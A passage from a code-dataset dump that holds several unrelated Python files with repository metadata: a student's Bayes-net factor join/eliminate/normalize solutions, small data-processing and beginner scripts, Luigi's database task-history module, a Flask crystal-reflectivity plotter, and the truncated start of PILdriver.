len([factor for factor in currentFactorsToJoin if joinVariable in factor.unconditionedVariables()])\n        if numVariableOnLeft > 1:\n            print \"Factor failed joinFactorsByVariable typecheck: \", factor\n            raise ValueError, (\"The joinBy variable can only appear in one factor as an \\nunconditioned variable. \\n\" +  \n                               \"joinVariable: \" + str(joinVariable) + \"\\n\" +\n                               \", \".join(map(str, [factor.unconditionedVariables() for factor in currentFactorsToJoin])))\n        \n        joinedFactor = joinFactors(currentFactorsToJoin)\n        return currentFactorsNotToJoin, joinedFactor\n\n    return joinFactorsByVariable\n\njoinFactorsByVariable = joinFactorsByVariableWithCallTracking()\n\n\ndef joinFactors(factors):\n    \"\"\"\n    Question 3: Your join implementation \n\n    Input factors is a list of factors.  \n    \n    You should calculate the set of unconditioned variables and conditioned \n    variables for the join of those factors.\n\n    Return a new factor that has those variables and whose probability entries \n    are product of the corresponding rows of the input factors.\n\n    You may assume that the variableDomainsDict for all the input \n    factors are the same, since they come from the same BayesNet.\n\n    joinFactors will only allow unconditionedVariables to appear in \n    one input factor (so their join is well defined).\n\n    Hint: Factor methods that take an assignmentDict as input \n    (such as getProbability and setProbability) can handle \n    assignmentDicts that assign more variables than are in that factor.\n\n    Useful functions:\n    Factor.getAllPossibleAssignmentDicts\n    Factor.getProbability\n    Factor.setProbability\n    Factor.unconditionedVariables\n    Factor.conditionedVariables\n    Factor.variableDomainsDict\n    \"\"\"\n\n    # typecheck portion\n    setsOfUnconditioned = [set(factor.unconditionedVariables()) for factor in factors]\n    if len(factors) > 1:\n        intersect = reduce(lambda x, y: x & y, setsOfUnconditioned)\n        if len(intersect) > 0:\n            print \"Factor failed joinFactors typecheck: \", factor\n            raise ValueError, (\"unconditionedVariables can only appear in one factor. \\n\"\n                    + \"unconditionedVariables: \" + str(intersect) + \n                    \"\\nappear in more than one input factor.\\n\" + \n                    \"Input factors: \\n\" +\n                    \"\\n\".join(map(str, factors)))\n\n\n    \"*** YOUR CODE HERE ***\"\n    set1 = Set()\n    set2 = Set()\n    for factor in factors:\n        for variable in factor.unconditionedVariables():\n            set1.add(variable)\n        for variable in factor.conditionedVariables():\n            set2.add(variable)\n    inter = set1 & set2\n    union = set1 | set2\n    conditioned = Set()\n    unconditioned = Set()\n    for variable in list(union):\n        if variable in inter:\n            unconditioned.add(variable)\n        elif variable in set1:\n            unconditioned.add(variable)\n        else:\n            conditioned.add(variable)\n    result = Factor(list(unconditioned), list(conditioned), factors[0].variableDomainsDict())\n    for assignment in result.getAllPossibleAssignmentDicts():\n        product = 1\n        for factor in factors:\n            product = product * factor.getProbability(assignment)\n        result.setProbability(assignment, product)\n    return result\n\n\ndef eliminateWithCallTracking(callTrackingList=None):\n\n    def eliminate(factor, eliminationVariable):\n        \"\"\"\n        Question 4: Your eliminate implementation \n\n        Input factor is a single factor.\n        Input eliminationVariable is the variable to eliminate from factor.\n        eliminationVariable must be an unconditioned variable in factor.\n        \n        You should calculate the set of unconditioned variables and conditioned \n        variables for the factor obtained by eliminating the variable\n        eliminationVariable.\n\n        Return a new factor where all of the rows mentioning\n        eliminationVariable are summed with rows that match\n        assignments on the other variables.\n\n        Useful functions:\n        Factor.getAllPossibleAssignmentDicts\n        Factor.getProbability\n        Factor.setProbability\n        Factor.unconditionedVariables\n        Factor.conditionedVariables\n        Factor.variableDomainsDict\n        \"\"\"\n        # autograder tracking -- don't remove\n        if not (callTrackingList is None):\n            callTrackingList.append(('eliminate', eliminationVariable))\n\n        # typecheck portion\n        if eliminationVariable not in factor.unconditionedVariables():\n            print \"Factor failed eliminate typecheck: \", factor\n            raise ValueError, (\"Elimination variable is not an unconditioned variable \" \\\n                            + \"in this factor\\n\" + \n                            \"eliminationVariable: \" + str(eliminationVariable) + \\\n                            \"\\nunconditionedVariables:\" + str(factor.unconditionedVariables()))\n        \n        if len(factor.unconditionedVariables()) == 1:\n            print \"Factor failed eliminate typecheck: \", factor\n            raise ValueError, (\"Factor has only one unconditioned variable, so you \" \\\n                    + \"can't eliminate \\nthat variable.\\n\" + \\\n                    \"eliminationVariable:\" + str(eliminationVariable) + \"\\n\" +\\\n                    \"unconditionedVariables: \" + str(factor.unconditionedVariables()))\n\n        \"*** YOUR CODE HERE ***\"\n        unconditioned = factor.unconditionedVariables()\n        unconditioned.remove(eliminationVariable)\n        result = Factor(unconditioned, factor.conditionedVariables(), factor.variableDomainsDict())\n        for assignment in result.getAllPossibleAssignmentDicts():\n            s = 0\n            for factorAssignment in factor.getAllPossibleAssignmentDicts():\n                f = True\n                for variable in unconditioned:\n                    if factorAssignment[variable] != assignment[variable]:\n                        f = False\n                for variable in result.conditionedVariables():\n                    if factorAssignment[variable] != assignment[variable]:\n                        f = False\n                if f:\n                    s += factor.getProbability(factorAssignment)\n            result.setProbability(assignment, s)\n        return result\n\n    return eliminate\n\neliminate = eliminateWithCallTracking()\n\n\ndef normalize(factor):\n    \"\"\"\n    Question 5: Your normalize implementation \n\n    Input factor is a single factor.\n\n    The set of conditioned variables for the normalized factor consists \n    of the input factor's conditioned variables as well as any of the \n    input factor's unconditioned variables with exactly one entry in their \n    domain.  Since there is only one entry in that variable's domain, we \n    can either assume it was assigned as evidence to have only one variable \n    in its domain, or it only had one entry in its domain to begin with.\n    This blurs the distinction between evidence assignments and variables \n    with single value domains, but that is alright since we have to assign \n    variables that only have one value in their domain to that single value.\n\n    Return a new factor where the sum of the all the probabilities in the table is 1.\n    This should be a new factor, not a modification of this factor in place.\n\n    If the sum of probabilities in the input factor is 0,\n    you should return None.\n\n    This is intended to be used at the end of a probabilistic inference query.\n    Because of this, all variables that have more than one element in their \n    domain are assumed to be unconditioned.\n    There are more general implementations of normalize, but we will only \n    implement this version.\n\n    Useful functions:\n    Factor.getAllPossibleAssignmentDicts\n    Factor.getProbability\n    Factor.setProbability\n    Factor.unconditionedVariables\n    Factor.conditionedVariables\n    Factor.variableDomainsDict\n    \"\"\"\n\n    # typecheck portion\n    variableDomainsDict = factor.variableDomainsDict()\n    for conditionedVariable in factor.conditionedVariables():\n        if len(variableDomainsDict[conditionedVariable]) > 1:\n            print \"Factor failed normalize typecheck: \", factor\n            raise ValueError, (\"The factor to be normalized must have only one \" + \\\n                            \"assignment of the \\n\" + \"conditional variables, \" + \\\n                            \"so that total probability will sum to 1\\n\" + \n                            str(factor))\n\n    \"*** YOUR CODE HERE ***\"\n    unconditioned = factor.unconditionedVariables()\n    conditioned = factor.conditionedVariables()\n    for variable in factor.unconditionedVariables():\n        entry = Set()\n        for assignment in factor.getAllPossibleAssignmentDicts():\n            entry.add(assignment[variable])\n        if len(entry) == 1:\n            unconditioned.remove(variable)\n            conditioned.add(variable)\n    result = Factor(unconditioned, conditioned, factor.variableDomainsDict())\n    total = 0\n    for assignment in factor.getAllPossibleAssignmentDicts():\n        total += factor.getProbability(assignment)\n    for assignment in result.getAllPossibleAssignmentDicts():\n        prob = factor.getProbability(assignment)\n        result.setProbability(assignment, prob / float(total))\n    return result\n\n"}
{"blob_id": "2104e52a62159aaf6b2aa7340a1ffee5ff9e189d", "directory_id": "0b78e941cf38ddf14f9a4cd85ac7dc31834e487d", "path": "/reducer_datasets.py~", "content_id": "8bb59202d35b5243da78be2a13d0d21aca950b5c", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "90lantran/Intro-to-Hadoop-Mapreduce", "snapshot_id": "f27d3e861263ee528f3c0003fd4affcef0831025", "revision_id": "68655b8b0762c50368a28d1b7e3c7e12e5e975d0", "branch_name": "refs/heads/master", "visit_date": "2016-09-01 15:53:44.116467", "revision_date": "2016-01-09 10:17:04", "committer_date": "2016-01-09 10:17:04", "github_id": "49309672", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "242", "extension": "", "content": "#!/usr/bin/python\n# Here you will be able to combine the values that come from 2 sources\n# Value that starts with A will be the user data\n# Values that start with B will be forum node data\n\nimport sys\n    \n\nfor line in sys.stdin:\n\t        \n\t\n"}
{"blob_id": "c70a414ce684db35a14b9ba8b7e116be36d02559", "directory_id": "1b21e07f6404b30fd0253142f3a685b06707ed0b", "path": "/src/tec/ic/ia/p2/g08_random_stuff.py", "content_id": "01c277a1e02c9730968c9eacdd2acee4a5777649", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "Fuabioo/Proyecto-2-Relaciones-Etimologia", "snapshot_id": "57f5128e550e9a097921e86c635b90e9a703eabb", "revision_id": "7e8515d6a051173401cadd0c02a463122cbb35a0", "branch_name": "refs/heads/master", "visit_date": "2020-03-19 02:38:02.517312", "revision_date": "2018-06-17 04:35:25", "committer_date": "2018-06-17 04:35:25", "github_id": "135646089", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1484", "extension": "py", "content": "'''\nimport random\n\nwith open('etymwn_mini.tsv', 'w', encoding=\"utf-8\") as minitsv:\n    with open('etymwn.tsv', 'r', encoding=\"utf-8\") as tsvfile:\n        for line in tsvfile:\n            if(random.random() < 0.05):\n                minitsv.writelines(line)\nminitsv.close()\ntsvfile.close()\n'''\nimport random\ncont = 0\nwith open('cl.cl', 'w', encoding=\"utf-8\") as minitsv:\n\t\n    with open('etymwn.tsv', 'r', encoding=\"utf-8\") as tsvfile:\n        for line in tsvfile:\n\t        #if(random.random() < 0.01):\n            stringTell = \"\"\n            columns = line.split(\"\\t\")\n            language_tag = columns[0].split(':')[0]\n            word_1 = '\"'+ columns[0].split(':')[1].replace('\"', \"'\").replace('\u2028','') + '\"'\n            relation = columns[1].split(':')[1]\n            word_2 = '\"' + columns[2].split(':')[1].replace(\"\\n\", \"\").replace('\"', \"'\").replace('\u2028','') + '\"'\n            word_2_lang = columns[2].split(':')[0]\n\n            #stringTell+= (\"+ hasWord(\"+language_tag.lower()+\",\"+word_1.lower()+\")\\n\")\n            #stringTell+= (\"+ hasWord(\"+word_2_lang.lower()+\",\"+word_2.lower()+\")\\n\")\n            #stringTell+=  (language_tag, word_1, relation, word_2, word_2_lang)\n            stringTell+= (\"+ \" + relation.lower() + \"(\" + word_1.lower() + \",\" + language_tag.lower() + \",\" + word_2.lower()+ \",\" + word_2_lang.lower() +\")\\n\" )\n\n            minitsv.writelines(stringTell)\n            cont+=1\n            if cont == 60000:\n            \tbreak\nminitsv.close()\ntsvfile.close()"}
{"blob_id": "3f75b7932d55d576c2f0232128f2c318d967df28", "directory_id": "a92eca40614b9cb1340a046ff718e039341cf7f2", "path": "/functions_examples.py", "content_id": "fdd5e40532dfce34cbee06b6d1ece8c79ee0facd", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "Sekhriritu/Python_Basics", "snapshot_id": "cd30fb3320c62ece39cdd2609369742a49c08995", "revision_id": "ee501ea5f9a979ac92392df803991bc6d4bff9af", "branch_name": "refs/heads/main", "visit_date": "2023-05-01 02:21:24.948765", "revision_date": "2021-05-23 13:21:44", "committer_date": "2021-05-23 13:21:44", "github_id": "370056862", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1045", "extension": "py", "content": "# Exercise functions with no params\r\n\r\ndef hello_world_printer():\r\n    print(\"hello world!\")\r\n\r\n\r\nhello_world_printer()\r\n\r\n\r\n# Exercise functions with one params\r\n\r\n\r\ndef name_printer(name):\r\n    print(name)\r\n\r\n\r\nname = input(\"enter your name\")\r\nname_printer(name)\r\n\r\n\r\n# Volume of the Rectangular Prism\r\n\r\ndef vol_prism(length, width, height):\r\n    return length * width * height\r\n\r\n\r\nlength = int(input(\"Enter the length\"))\r\nwidth = int(input(\"Enter the width\"))\r\nheight = int(input(\"Enter the height\"))\r\n\r\nprint(\"The volume of the rectangular prism is \" + str(vol_prism(length, width, height)) + \" cubic feet.\")\r\n\r\n# Programming Challenge: Celsius to Fahrenheit\r\n\r\ntemp_celsius = int(input(\"Enter the temperature\"))\r\n\r\n\r\ndef func_fahrenheit(temp_celsius):\r\n    return round(1.8 * temp_celsius + 32, 1)\r\n\r\n\r\nprint(\"Temp in Fahrenheit is \" + str(func_fahrenheit(temp_celsius)))\r\n\r\n\r\ndef func_fahrenheit1(temp_celsius):\r\n    return ((18 * temp_celsius + 320)/10)\r\n\r\n\r\nprint(\"Temp in Fahrenheit is \" + str(func_fahrenheit1(temp_celsius)))\r\n\r\n\r\n\r\n"}
{"blob_id": "a43398d15a6db0942b09743f5b0b926b3c188d4e", "directory_id": "217bdf94bf15405a84bfd37116de400daa0b3d33", "path": "/luigi/db_task_history.py", "content_id": "17d7102efb53e3f526b50f32f05b2f170367e852", "detected_licenses": "['Apache-2.0']", "license_type": "permissive", "repo_name": "neilisaac/luigi", "snapshot_id": "cab1f26fec56f39b0ec845082ddb73eb5a24f0de", "revision_id": "75d4b90bbcaeda65b2dc0803a7ced63968ddb58a", "branch_name": "refs/heads/master", "visit_date": "2020-12-25 05:04:13.514219", "revision_date": "2015-03-03 15:25:45", "committer_date": "2015-03-03 15:25:45", "github_id": "31618252", "star_events_count": "0", "fork_events_count": "1", "gha_license_id": "None", "gha_event_created_at": "2015-03-03 19:58:01", "gha_created_at": "2015-03-03 19:58:01", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "7526", "extension": "py", "content": "# -*- coding: utf-8 -*-\n#\n# Copyright 2012-2015 Spotify AB\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\n\"\"\"\nProvides a database backend to the central scheduler. This lets you see historical runs.\nSee :ref:`TaskHistory` for information about how to turn out the task history feature.\n\"\"\"\n\nimport datetime\nimport logging\nfrom contextlib import contextmanager\n\nfrom luigi import six\n\nfrom luigi import configuration\nfrom luigi import task_history\nfrom luigi.task_status import DONE, FAILED, PENDING, RUNNING\n\nimport sqlalchemy\nimport sqlalchemy.ext.declarative\nimport sqlalchemy.orm\nimport sqlalchemy.orm.collections\nBase = sqlalchemy.ext.declarative.declarative_base()\n\nlogger = logging.getLogger('luigi-interface')\n\n\nclass DbTaskHistory(task_history.TaskHistory):\n    \"\"\"\n    Task History that writes to a database using sqlalchemy.\n    Also has methods for useful db queries.\n    \"\"\"\n    @contextmanager\n    def _session(self, session=None):\n        if session:\n            yield session\n        else:\n            session = self.session_factory()\n            try:\n                yield session\n            except:\n                session.rollback()\n                raise\n            else:\n                session.commit()\n\n    def __init__(self):\n        config = configuration.get_config()\n        connection_string = config.get('task_history', 'db_connection')\n        self.engine = sqlalchemy.create_engine(connection_string)\n        self.session_factory = sqlalchemy.orm.sessionmaker(bind=self.engine, expire_on_commit=False)\n        Base.metadata.create_all(self.engine)\n        self.tasks = {}  # task_id -> TaskRecord\n\n    def task_scheduled(self, task_id):\n        task = self._get_task(task_id, status=PENDING)\n        self._add_task_event(task, TaskEvent(event_name=PENDING, ts=datetime.datetime.now()))\n\n    def task_finished(self, task_id, successful):\n        event_name = DONE if successful else FAILED\n        task = self._get_task(task_id, status=event_name)\n        self._add_task_event(task, TaskEvent(event_name=event_name, ts=datetime.datetime.now()))\n\n    def task_started(self, task_id, worker_host):\n        task = self._get_task(task_id, status=RUNNING, host=worker_host)\n        self._add_task_event(task, TaskEvent(event_name=RUNNING, ts=datetime.datetime.now()))\n\n    def _get_task(self, task_id, status, host=None):\n        if task_id in self.tasks:\n            task = self.tasks[task_id]\n            task.status = status\n            if host:\n                task.host = host\n        else:\n            task = self.tasks[task_id] = task_history.Task(task_id, status, host)\n        return task\n\n    def _add_task_event(self, task, event):\n        for (task_record, session) in self._find_or_create_task(task):\n            task_record.events.append(event)\n\n    def _find_or_create_task(self, task):\n        with self._session() as session:\n            if task.record_id is not None:\n                logger.debug(\"Finding task with record_id [%d]\", task.record_id)\n                task_record = session.query(TaskRecord).get(task.record_id)\n                if not task_record:\n                    raise Exception(\"Task with record_id, but no matching Task record!\")\n                yield (task_record, session)\n            else:\n                task_record = TaskRecord(name=task.task_family, host=task.host)\n                for (k, v) in six.iteritems(task.parameters):\n                    task_record.parameters[k] = TaskParameter(name=k, value=v)\n                session.add(task_record)\n                yield (task_record, session)\n            if task.host:\n                task_record.host = task.host\n        task.record_id = task_record.id\n\n    def find_all_by_parameters(self, task_name, session=None, **task_params):\n        \"\"\"\n        Find tasks with the given task_name and the same parameters as the kwargs.\n        \"\"\"\n        with self._session(session) as session:\n            tasks = session.query(TaskRecord).join(TaskEvent).filter(TaskRecord.name == task_name).order_by(TaskEvent.ts).all()\n            for task in tasks:\n                if all(k in task.parameters and v == str(task.parameters[k].value) for (k, v) in six.iteritems(task_params)):\n                    yield task\n\n    def find_all_by_name(self, task_name, session=None):\n        \"\"\"\n        Find all tasks with the given task_name.\n        \"\"\"\n        return self.find_all_by_parameters(task_name, session)\n\n    def find_latest_runs(self, session=None):\n        \"\"\"\n        Return tasks that have been updated in the past 24 hours.\n        \"\"\"\n        with self._session(session) as session:\n            yesterday = datetime.datetime.now() - datetime.timedelta(days=1)\n            return session.query(TaskRecord).\\\n                join(TaskEvent).\\\n                filter(TaskEvent.ts >= yesterday).\\\n                group_by(TaskRecord.id, TaskEvent.event_name).\\\n                order_by(TaskEvent.ts.desc()).\\\n                all()\n\n    def find_task_by_id(self, id, session=None):\n        \"\"\"\n        Find task with the given record ID.\n        \"\"\"\n        with self._session(session) as session:\n            return session.query(TaskRecord).get(id)\n\n\nclass TaskParameter(Base):\n    \"\"\"\n    Table to track luigi.Parameter()s of a Task.\n    \"\"\"\n    __tablename__ = 'task_parameters'\n    task_id = sqlalchemy.Column(sqlalchemy.Integer, sqlalchemy.ForeignKey('tasks.id'), primary_key=True)\n    name = sqlalchemy.Column(sqlalchemy.String(128), primary_key=True)\n    value = sqlalchemy.Column(sqlalchemy.String(256))\n\n    def __repr__(self):\n        return \"TaskParameter(task_id=%d, name=%s, value=%s)\" % (self.task_id, self.name, self.value)\n\n\nclass TaskEvent(Base):\n    \"\"\"\n    Table to track when a task is scheduled, starts, finishes, and fails.\n    \"\"\"\n    __tablename__ = 'task_events'\n    id = sqlalchemy.Column(sqlalchemy.Integer, primary_key=True)\n    task_id = sqlalchemy.Column(sqlalchemy.Integer, sqlalchemy.ForeignKey('tasks.id'))\n    event_name = sqlalchemy.Column(sqlalchemy.String(20))\n    ts = sqlalchemy.Column(sqlalchemy.TIMESTAMP, index=True)\n\n    def __repr__(self):\n        return \"TaskEvent(task_id=%s, event_name=%s, ts=%s\" % (self.task_id, self.event_name, self.ts)\n\n\nclass TaskRecord(Base):\n    \"\"\"\n    Base table to track information about a luigi.Task.\n\n    References to other tables are available through task.events, task.parameters, etc.\n    \"\"\"\n    __tablename__ = 'tasks'\n    id = sqlalchemy.Column(sqlalchemy.Integer, primary_key=True)\n    name = sqlalchemy.Column(sqlalchemy.String(128), index=True)\n    host = sqlalchemy.Column(sqlalchemy.String(128))\n    parameters = sqlalchemy.orm.relationship(\n        'TaskParameter',\n        collection_class=sqlalchemy.orm.collections.attribute_mapped_collection('name'),\n        cascade=\"all, delete-orphan\")\n    events = sqlalchemy.orm.relationship(\n        'TaskEvent',\n        order_by=lambda: TaskEvent.ts.desc(),\n        backref='task')\n\n    def __repr__(self):\n        return \"TaskRecord(name=%s, host=%s)\" % (self.name, self.host)\n"}
{"blob_id": "93960bba1f6d68dc33295386b71fb26e4f55aef1", "directory_id": "6a39c4154448ccd7caf6343c253dd20989f4981f", "path": "/FirstSlider.py", "content_id": "62030478aac072c6a54d475eeb567924b418d3b4", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "yxrmz/xrt_web_calculator", "snapshot_id": "b97887a4174fa52301e527e65e9d86ada34a6b03", "revision_id": "05b9f19822152788776e99cb6969b7b8b2614ea2", "branch_name": "refs/heads/main", "visit_date": "2023-06-21 05:53:04.408796", "revision_date": "2021-08-11 20:01:53", "committer_date": "2021-08-11 20:01:53", "github_id": "395102419", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "2615", "extension": "py", "content": "from flask import Flask, render_template,request\nimport plotly\nimport plotly.graph_objs as go\n\nimport pandas as pd\nimport numpy as np\nimport json\n\nimport os, sys;\nsys.path.append(r'G:/xrt-1.3.4')  # analysis:ignore\nimport xrt.backends.raycing.materials as rm\n\nkwargs = {'geometry': \"Bragg\",\n          'material': \"Si\",\n          'energy': 9000,\n          'hkl_h': 1,\n          'hkl_k': 1,\n          'hkl_l': 1,\n          'thickness': 1.,\n          'asymmetry': 0}\n\napp = Flask(__name__)\n\ndef calc_vectors(theta, alphaDeg, geom):\n    alpha = np.radians(alphaDeg)\n    s0 = (np.zeros_like(theta), np.cos(theta+alpha), -np.sin(theta+alpha))\n    sh = (np.zeros_like(theta), np.cos(theta-alpha), np.sin(theta-alpha))\n    if geom.startswith('Bragg'):\n        n = (0, 0, 1)  # outward surface normal\n    else:\n        n = (0, -1, 0)  # outward surface normal\n    hn = (0, np.sin(alpha), np.cos(alpha))  # outward Bragg normal\n    gamma0 = sum(i*j for i, j in zip(n, s0))\n    gammah = sum(i*j for i, j in zip(n, sh))\n    hns0 = sum(i*j for i, j in zip(hn, s0))\n    return gamma0, gammah, hns0\n\n\n@app.route('/')\ndef index_slider():\n    return render_template('tableinput.html', plot=create_plot(**kwargs))\n\ndef create_plot(**kwargs_in):\n    hkl = [int(kwargs_in['hkl_h']),\n           int(kwargs_in['hkl_k']),\n           int(kwargs_in['hkl_l'])]\n    geom = str(kwargs_in['geometry'])\n    crystal = rm.CrystalSi(hkl=hkl,\n                           geom=geom + ' reflected',\n                           t=float(kwargs_in['thickness']))\n    E = float(kwargs_in['energy'])\n    dtheta = np.linspace(-100, 100, 501)\n    theta = crystal.get_Bragg_angle(E) + dtheta*1e-6\n    asymmDeg = float(kwargs_in['asymmetry'])  # Degrees\n\n    g0, gh, hs0 = calc_vectors(theta, asymmDeg, geom)\n    curS, curP = crystal.get_amplitude(E, g0, gh, hs0)\n    data = [go.Line(x=dtheta, y=abs(curS)**2)]\n#    print(kwargs_in)\n    graphJSON = json.dumps(data, cls=plotly.utils.PlotlyJSONEncoder)\n\n    return graphJSON\n\n#@app.route('/recalc', methods=['GET', 'POST'])\n#def change_features():\n#    sfreq = request.args['sfreq']\n#    print(sfreq)\n#    kwargs = {'freq': sfreq}\n#    graphJSON= create_plot(**kwargs)\n#\n#    return graphJSON\n\n@app.route('/recalc', methods=['GET', 'POST'])\ndef change_param():\n    param_name = request.args['pname']\n    param_value = request.args['pvalue']\n#    print(request.args)\n#    kwargs = np.copy(default_kwargs)\n    global kwargs\n    kwargs[param_name] = param_value\n#    print(kwargs)\n    graphJSON = create_plot(**kwargs)\n    return graphJSON\n\n\nif __name__ == '__main__':\n    app.run(host=\"192.168.2.119\", port=\"5080\")\n"}
{"blob_id": "69a2a03c6dfaed073ff8d2652c1c4c1c9af2bf29", "directory_id": "1a2526b366a5ed87d1cc30d282a28d05c3234d84", "path": "/dev/bin/pildriver.py", "content_id": "5c70d4470c8899acbe2389963afc33af253ae291", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "adin234/summarizer_api", "snapshot_id": "155c7f55b507e8998246a16b89fb804352189028", "revision_id": "50a1c6cf86fafa15f5b9640e8834db8b5c53be08", "branch_name": "refs/heads/master", "visit_date": "2020-05-17 18:48:34.476766", "revision_date": "2015-03-17 18:37:44", "committer_date": "2015-03-17 18:37:44", "github_id": "32412711", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "15356", "extension": "py", "content": "#!/Volumes/Data/codez/python/summarizer_api/dev/bin/python\n\"\"\"PILdriver, an image-processing calculator using PIL.\n\nAn instance of class PILDriver is essentially a software stack machine\n(Polish-notation interpreter) for sequencing PIL image\ntransformations.  The state of the instance is the interpreter stack.\n\nThe only method one will normally invoke after initialization is the\n`execute' method.  This takes an argument list of tokens, pushes them\nonto the instance's stack, and then tries to clear the stack by\nsuccessive evaluation of PILdriver operators.  Any part of the stack\nnot cleaned off persists and is part of the evaluation context for\nthe next call of the execute method.\n\nPILDriver doesn't catch any exceptions, on the theory that these\nare actually diagnostic information that should be interpreted by\nthe calling code.\n\nWhen called as a script, the command-line arguments are passed to\na PILDriver instance.  If there are no command-line arguments, the\nmodule runs an interactive interpreter, each line of which is split into\nspace-separated tokens and passed to the execute method.\n\nIn the method descriptions below, a first line beginning with the string\n`usage:' means this method can be invoked with the token that follows\nit.  Following <>-enclosed arguments describe how the method interprets\nthe entries on the stack.  Each argument specification begins with a\ntype specification: either `int', `float', `string', or `image'.\n\nAll operations consume their arguments off the stack (use `dup' to\nkeep copies around).  Use `verbose 1' to see the stack state displayed\nbefore each operation.\n\nUsage examples:\n\n    `show crop 0 0 200 300 open test.png' loads test.png, crops out a portion\nof its upper-left-hand corner and displays the cropped portion.\n\n    `save rotated.png rotate 30 open test.tiff' loads test.tiff, rotates it\n30 degrees, and saves the result as rotated.png (in PNG format).\n\"\"\"\n# by Eric S. Raymond <esr@thyrsus.com>\n# $Id$\n\n# TO DO:\n# 1. Add PILFont capabilities, once that's documented.\n# 2. Add PILDraw operations.\n# 3. Add support for composing and decomposing multiple-image files.\n#\n\nfrom PIL import Image\nimport string\n\nclass PILDriver:\n\n    verbose = 0\n\n    def do_verbose(self):\n        \"\"\"usage: verbose <int:num>\n\n        Set verbosity flag from top of stack.\n        \"\"\"\n        self.verbose = self.do_pop()\n\n    # The evaluation stack (internal only)\n\n    stack = []          # Stack of pending operations\n\n    def push(self, item):\n        \"Push an argument onto the evaluation stack.\"\n        self.stack = [item] + self.stack\n\n    def top(self):\n        \"Return the top-of-stack element.\"\n        return self.stack[0]\n\n    # Stack manipulation (callable)\n\n    def do_clear(self):\n        \"\"\"usage: clear\n\n        Clear the stack.\n        \"\"\"\n        self.stack = []\n\n    def do_pop(self):\n        \"\"\"usage: pop\n\n        Discard the top element on the stack.\n        \"\"\"\n        top = self.stack[0]\n        self.stack = self.stack[1:]\n        return top\n\n    def do_dup(self):\n        \"\"\"usage: dup\n\n        Duplicate the top-of-stack item.\n        \"\"\"\n        if hasattr(self, 'format'):     # If it's an image, do a real copy\n            dup = self.stack[0].copy()\n        else:\n            dup = self.stack[0]\n        self.stack = [dup] + self.stack\n\n    def do_swap(self):\n        \"\"\"usage: swap\n\n        Swap the top-of-stack item with the next one down.\n        \"\"\"\n        self.stack = [self.stack[1], self.stack[0]] + self.stack[2:]\n\n    # Image module functions (callable)\n\n    def do_new(self):\n        \"\"\"usage: new <int:xsize> <int:ysize> <int:color>:\n\n        Create and push a greyscale image of given size and color.\n        \"\"\"\n        xsize = int(self.do_pop())\n        ysize = int(self.do_pop())\n        color = int(self.do_pop())\n        self.push(Image.new(\"L\", (xsize, ysize), color))\n\n    def do_open(self):\n        \"\"\"usage: open <string:filename>\n\n        Open the indicated image, read it, push the image on the stack.\n        \"\"\"\n        self.push(Image.open(self.do_pop()))\n\n    def do_blend(self):\n        \"\"\"usage: blend <image:pic1> <image:pic2> <float:alpha>\n\n        Replace two images and an alpha with the blended image.\n        \"\"\"\n        image1 = self.do_pop()\n        image2 = self.do_pop()\n        alpha = float(self.do_pop())\n        self.push(Image.blend(image1, image2, alpha))\n\n    def do_composite(self):\n        \"\"\"usage: composite <image:pic1> <image:pic2> <image:mask>\n\n        Replace two images and a mask with their composite.\n        \"\"\"\n        image1 = self.do_pop()\n        image2 = self.do_pop()\n        mask = self.do_pop()\n        self.push(Image.composite(image1, image2, mask))\n\n    def do_merge(self):\n        \"\"\"usage: merge <string:mode> <image:pic1> [<image:pic2> [<image:pic3> [<image:pic4>]]]\n\n        Merge top-of stack images in a way described by the mode.\n        \"\"\"\n        mode = self.do_pop()\n        bandlist = []\n        for band in mode:\n            bandlist.append(self.do_pop())\n        self.push(Image.merge(mode, bandlist))\n\n    # Image class methods\n\n    def do_convert(self):\n        \"\"\"usage: convert <string:mode> <image:pic1>\n\n        Convert the top image to the given mode.\n        \"\"\"\n        mode = self.do_pop()\n        image = self.do_pop()\n        self.push(image.convert(mode))\n\n    def do_copy(self):\n        \"\"\"usage: copy <image:pic1>\n\n        Make and push a true copy of the top image.\n        \"\"\"\n        self.dup()\n\n    def do_crop(self):\n        \"\"\"usage: crop <int:left> <int:upper> <int:right> <int:lower> <image:pic1>\n\n        Crop and push a rectangular region from the current image.\n        \"\"\"\n        left = int(self.do_pop())\n        upper = int(self.do_pop())\n        right = int(self.do_pop())\n        lower = int(self.do_pop())\n        image = self.do_pop()\n        self.push(image.crop((left, upper, right, lower)))\n\n    def do_draft(self):\n        \"\"\"usage: draft <string:mode> <int:xsize> <int:ysize>\n\n        Configure the loader for a given mode and size.\n        \"\"\"\n        mode = self.do_pop()\n        xsize = int(self.do_pop())\n        ysize = int(self.do_pop())\n        self.push(self.draft(mode, (xsize, ysize)))\n\n    def do_filter(self):\n        \"\"\"usage: filter 